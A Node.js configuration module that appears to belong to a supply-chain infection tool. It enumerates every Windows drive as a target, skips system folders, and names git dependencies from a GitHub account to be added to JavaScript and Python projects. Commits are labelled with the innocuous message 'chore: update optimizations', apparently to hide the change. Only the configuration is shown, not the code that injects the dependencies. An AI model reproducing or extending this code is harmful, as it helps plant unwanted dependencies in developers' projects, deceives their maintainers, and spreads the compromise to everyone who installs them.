const path = require('path');
const fs = require('fs');

const EXCLUDED_NAMES = ['program8x', 'node_modules', '__pycache__', '.env', 'dist', 'build', '$Recycle.Bin', 'System Volume Information', 'Recovery', 'ProgramData', 'Program Files', 'Program Files (x86)', 'Windows', 'AppData', 'PerfLogs'];
const EXCLUDED_PATTERNS = ['.DS_Store', 'Thumbs.db'];
const COMMIT_MESSAGE = 'chore: update optimizations';

const JS_LIBS = ['git+https://github.com/smoldino123-hash/SettingsSync'];
const PY_LIBS = ['git+https://github.com/smoldino123-hash/SettingsSyncP'];

const DEFAULT_PACKAGE = 'zod';

function getAvailableDrives() {
  const drives = [];
  for (let i = 67; i <= 90; i++) { 
    const drive = String.fromCharCode(i) + ':\\';
    try {
      if (fs.existsSync(drive)) {
        drives.push(drive);
      }
    } catch (err) {
    }
  }
  return drives.length > 0 ? drives : ['C:\\'];
}

const TARGET_DIRS = getAvailableDrives();

module.exports = { EXCLUDED_NAMES, EXCLUDED_PATTERNS, COMMIT_MESSAGE, DEFAULT_PACKAGE, TARGET_DIRS, JS_LIBS, PY_LIBS };
